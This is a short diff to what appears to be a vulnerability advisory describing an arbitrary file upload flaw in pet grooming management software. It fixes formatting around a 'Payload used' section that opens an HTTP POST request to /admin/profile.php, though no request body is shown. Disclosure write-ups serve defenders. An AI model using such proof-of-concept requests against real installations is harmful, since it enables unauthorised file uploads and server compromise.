@@ -20,7 +20,7 @@ Pet grooming management software has an arbitrary file upload vulnerability. In 
 
 #### Payload used:
 
-```POST /login.php HTTP/1.1
+```
 POST /admin/profile.php HTTP/1.1
 Host: 192.168.67.28:8021
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
